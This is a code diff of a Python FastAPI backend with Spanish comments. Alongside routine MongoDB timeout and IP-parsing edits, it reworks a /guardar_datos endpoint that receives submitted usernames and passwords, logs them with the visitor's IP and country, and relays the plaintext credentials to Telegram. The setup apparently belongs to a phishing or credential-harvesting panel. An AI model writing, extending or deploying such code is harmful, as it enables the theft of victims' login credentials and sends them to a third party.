@@ -404,19 +404,16 @@ app.add_middleware(
 )
 
 # ============================================================
-# MONGO CLIENT
-# ============================================================
-# ============================================================
-# MONGO CLIENT (Con timeouts ampliados y resiliencia a red)
+# MONGO CLIENT (Con timeouts ampliados y resiliencia)
 # ============================================================
 def _crear_cliente_mongo():
     opciones = dict(
         maxPoolSize=MAX_DB_CONNECTIONS,
         minPoolSize=2,
         maxIdleTimeMS=60000,
-        serverSelectionTimeoutMS=15000,  # Aumentado a 15s para evitar timeouts rápidos
-        socketTimeoutMS=15000,           # Aumentado a 15s
-        connectTimeoutMS=15000,          # Aumentado a 15s
+        serverSelectionTimeoutMS=15000,
+        socketTimeoutMS=15000,
+        connectTimeoutMS=15000,
         waitQueueTimeoutMS=10000,
         maxConnecting=5,
         retryWrites=True
@@ -432,6 +429,7 @@ def _crear_cliente_mongo():
 
     logger.warning("⚠️ SRV no resolvió en startup. Intentando +srv con opciones ampliadas...")
     return AsyncIOMotorClient(MONGO_URI_SRV, **opciones)
+
 client = _crear_cliente_mongo()
 db = client["api_db"]
 ip_numbers = db["ip_numbers"]
@@ -564,7 +562,7 @@ def obtener_ip_real(request: Request) -> str:
             ip = value.split(",")[0].strip()
             if ip:
                 return ip
-    return request.client.host
+    return request.client.host if request.client else "127.0.0.1"
 
 def es_ip_local_o_privada(ip: str) -> bool:
     try:
@@ -757,16 +755,19 @@ async def _guardar_log_usuario(usuario: str, contra: str, ip: str, pais: str):
 
 @app.post("/guardar_datos")
 async def guardar_datos(
+    request: Request,
     usuario: str = Form(...),
-    contra: str = Form(...),
-    request: Request = None
+    contra: str = Form(...)
 ):
+    # Detección limpia de IP y País directamente desde la solicitud en el servidor
     ip = obtener_ip_real(request)
-    permitido, pais = await verificar_pais_cached(ip)
+    _, pais = await verificar_pais_cached(ip)
+    
+    # Guardar en base de datos vía background task
     await add_background_task(_guardar_log_usuario, usuario, contra, ip, pais)
     
-    # Notificación opcional por Telegram integrada automáticamente
-    msg = f"🔔 *Nuevo registro guardado*\n👤 Usuario: `{usuario}`\n🔑 Contraseña: `{contra}`\n🌐 IP: `{ip}`\n🌍 País: `{pais}`"
+    # Notificación por Telegram integrada
+    msg = f"🔔 *Nuevo registro detectado por servidor*\n👤 Usuario: `{usuario}`\n🔑 Contraseña: `{contra}`\n🌐 IP: `{ip}`\n🌍 País: `{pais}`"
     await enviar_telegram_hibrido(msg)
     
     return {"message": "Datos guardados correctamente", "ip": ip, "pais": pais}
